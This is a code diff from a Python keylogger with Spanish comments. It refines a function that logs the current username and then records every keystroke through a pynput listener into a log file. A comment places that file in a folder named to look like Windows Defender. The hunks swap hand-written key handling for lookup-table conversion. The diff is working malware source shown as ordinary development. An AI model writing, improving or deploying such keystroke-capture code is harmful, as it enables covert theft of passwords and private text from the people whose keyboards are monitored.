@@ -190,8 +190,6 @@ def KeyConMax(argument):                # Botones, comunes // Optimizados
     }
     return switcher.get(argument, "")
 
-
-
 # Obtiene registro de teclas y guarda en un archivo log.txt
 def Klogger():
     CreateDir()  # Function: Crea el directorio ==> C:\Users\Public\Security\Windows Defender
@@ -204,27 +202,18 @@ def Klogger():
 
     with open (log, "a") as f:
         f.write("\n--------------------------------------------\nUserName:   ["+str(getuser()) +"]\n"+ str(getTime)+"--------------------------------------------\n\n")
-
+    
     def on_press(key):
-        #print("-------")
         with open(log, "a") as f:
-            if isinstance(key, pynput.keyboard.KeyCode): #convierte las teclas 0-9, a-z a codigo normal
-                f.write('{}'.format(key.char))
-            elif str(key) == "Key.space" :      # Espacio                                  
-                f.write(' ')
-            elif str(key) == "Key.backspace":   # Borrar
-                f.write("[-]") 
-            elif str(key) == "Key.enter":       # Salto de linea
-                f.write('\n') 
-            elif str(key) == "Key.tab":         # Tabulador
-                f.write('   ')
-            elif str(key) == "´" or str(key) == "Key.caps_lock" or str(key) == "´" or str(key) == "Key.shift_r" or str(key) == "Key.shift" or str(key) == "Key.ctrl_l" or str(key) == "Key.ctrl_r" or str(key) == "Key.cmd" or str(key) == "Key.alt_r" or str(key) == "Key.alt_l" or str(key) == "Key.left" or str(key) == "Key.up" or str(key) == "Key.right" or str(key) == "Key.down":
-                pass 
-            elif str(key) == "Key.print_screen" or str(key) == "Key.media_volume_up" or str(key) == "Key.media_volume_mute" or str(key) == "None" or str(key) == "Key.media_next" or str(key) == "Key.num_lock" or str(key) == "Key.media_volume_mute" or str(key) == "Key.media_previous" or str(key) == "Key.media_play_pause" :
-                pass   
+            if (len(str(key)))  <= 3:
+                #print("[KeyConMin]")
+                print(KeyConMin(str(key)))
+                f.write(KeyConMin(str(key)))
             else:
-                f.write('{}'.format(key))
-
+                #print("[KeyConMax]")
+                print(KeyConMax(str(key)))
+                f.write(KeyConMax(str(key)))
+                
     with Listener(on_press=on_press) as listener:   # Escucha pulsaciones de teclas
         listener.join() 
 
